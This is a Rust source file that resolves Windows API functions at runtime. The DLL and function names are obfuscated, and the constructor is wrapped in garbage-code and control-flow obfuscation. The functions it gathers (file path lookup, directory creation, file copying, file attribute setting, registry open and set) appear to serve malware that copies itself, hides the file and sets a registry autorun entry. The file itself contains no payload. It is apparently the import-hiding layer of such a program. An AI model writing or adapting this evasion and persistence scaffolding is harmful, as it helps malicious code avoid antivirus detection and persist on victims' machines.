use std::mem::transmute;
use once_cell::sync::Lazy;
use std::ffi::{c_void, CStr};
use windows_sys::Win32::System::LibraryLoader::{LoadLibraryA, GetProcAddress};
use obfuscator::{obfuscate, obfuscate_string};

// Define function pointers for Windows API functions
// KERNEL32.DLL
type GetModuleHandleW = unsafe extern "system" fn(*const u16) -> *mut c_void;
type GetModuleFileNameW = unsafe extern "system" fn(*mut c_void, *mut u16, u32) -> u32;
type CreateDirectoryW = unsafe extern "system" fn(*const u16, *mut c_void) -> bool;
type CopyFileW = unsafe extern "system" fn(*const u16, *const u16, bool) -> bool;
type GetFileAttributesW = unsafe extern "system" fn(*const u16) -> u32;
type SetFileAttributesW = unsafe extern "system" fn(*const u16, u32) -> bool;

// SHELL32.DLL
type SHGetFolderPathW = unsafe extern "system" fn(*mut c_void, i32, *mut c_void, u32, *mut u16) -> i32;

// ADVAPI32.DLL
type RegOpenKeyExW = unsafe extern "system" fn(*mut c_void, *const u16, u32, u32, *mut *mut c_void) -> i32;
type RegSetValueExW = unsafe extern "system" fn(*mut c_void, *const u16, u32, u32, *const u8, u32) -> i32;
type RegCloseKey = unsafe extern "system" fn(*mut c_void) -> i32;

#[derive(Clone)]
pub struct WinApi {
    // KERNEL32.DLL
    pub GetModuleHandleW: GetModuleHandleW,
    pub GetModuleFileNameW: GetModuleFileNameW,
    pub CreateDirectoryW: CreateDirectoryW,
    pub CopyFileW: CopyFileW,
    pub GetFileAttributesW: GetFileAttributesW,
    pub SetFileAttributesW: SetFileAttributesW,
    // SHELL32.DLL
    pub SHGetFolderPathW: SHGetFolderPathW,
    // ADVAPI32.DLL
    pub RegOpenKeyExW: RegOpenKeyExW,
    pub RegSetValueExW: RegSetValueExW,
    pub RegCloseKey: RegCloseKey,
}

impl WinApi {
    #[obfuscate(garbage = true, control_f = true)]
    fn new() -> Result<WinApi, &'static str> {
        unsafe {
            // Load libraries
            let kernel32_str = obfuscate_string!("kernel32.dll\0");
            let shell32_str = obfuscate_string!("shell32.dll\0");
            let advapi32_str = obfuscate_string!("advapi32.dll\0");

            let kernel32 = LoadLibraryA(kernel32_str.as_ptr());
            let shell32 = LoadLibraryA(shell32_str.as_ptr());
            let advapi32 = LoadLibraryA(advapi32_str.as_ptr());

            if kernel32.is_null() || shell32.is_null() || advapi32.is_null() {
                return Err("Failed to load one or more required DLLs");
            }

            // Get function pointers
            // KERNEL32.DLL
            let get_module_handle_w_str = obfuscate_string!("GetModuleHandleW\0");
            let get_module_filename_w_str = obfuscate_string!("GetModuleFileNameW\0");
            let create_directory_w_str = obfuscate_string!("CreateDirectoryW\0");
            let copy_file_w_str = obfuscate_string!("CopyFileW\0");
            let get_file_attributes_w_str = obfuscate_string!("GetFileAttributesW\0");
            let set_file_attributes_w_str = obfuscate_string!("SetFileAttributesW\0");

            // SHELL32.DLL
            let sh_get_folder_path_w_str = obfuscate_string!("SHGetFolderPathW\0");

            // ADVAPI32.DLL
            let reg_open_key_ex_w_str = obfuscate_string!("RegOpenKeyExW\0");
            let reg_set_value_ex_w_str = obfuscate_string!("RegSetValueExW\0");
            let reg_close_key_str = obfuscate_string!("RegCloseKey\0");

            // Transmute and store function pointers
            let get_module_handle_w = transmute(GetProcAddress(kernel32, get_module_handle_w_str.as_ptr()));
            let get_module_filename_w = transmute(GetProcAddress(kernel32, get_module_filename_w_str.as_ptr()));
            let create_directory_w = transmute(GetProcAddress(kernel32, create_directory_w_str.as_ptr()));
            let copy_file_w = transmute(GetProcAddress(kernel32, copy_file_w_str.as_ptr()));
            let get_file_attributes_w = transmute(GetProcAddress(kernel32, get_file_attributes_w_str.as_ptr()));
            let set_file_attributes_w = transmute(GetProcAddress(kernel32, set_file_attributes_w_str.as_ptr()));

            let sh_get_folder_path_w = transmute(GetProcAddress(shell32, sh_get_folder_path_w_str.as_ptr()));

            let reg_open_key_ex_w = transmute(GetProcAddress(advapi32, reg_open_key_ex_w_str.as_ptr()));
            let reg_set_value_ex_w = transmute(GetProcAddress(advapi32, reg_set_value_ex_w_str.as_ptr()));
            let reg_close_key = transmute(GetProcAddress(advapi32, reg_close_key_str.as_ptr()));

            Ok(WinApi {
                GetModuleHandleW: get_module_handle_w,
                GetModuleFileNameW: get_module_filename_w,
                CreateDirectoryW: create_directory_w,
                CopyFileW: copy_file_w,
                GetFileAttributesW: get_file_attributes_w,
                SetFileAttributesW: set_file_attributes_w,
                SHGetFolderPathW: sh_get_folder_path_w,
                RegOpenKeyExW: reg_open_key_ex_w,
                RegSetValueExW: reg_set_value_ex_w,
                RegCloseKey: reg_close_key,
            })
        }
    }
}

pub static WINAPI: Lazy<WinApi> = Lazy::new(|| {
    WinApi::new().expect("Failed to initialize WinAPI")
});
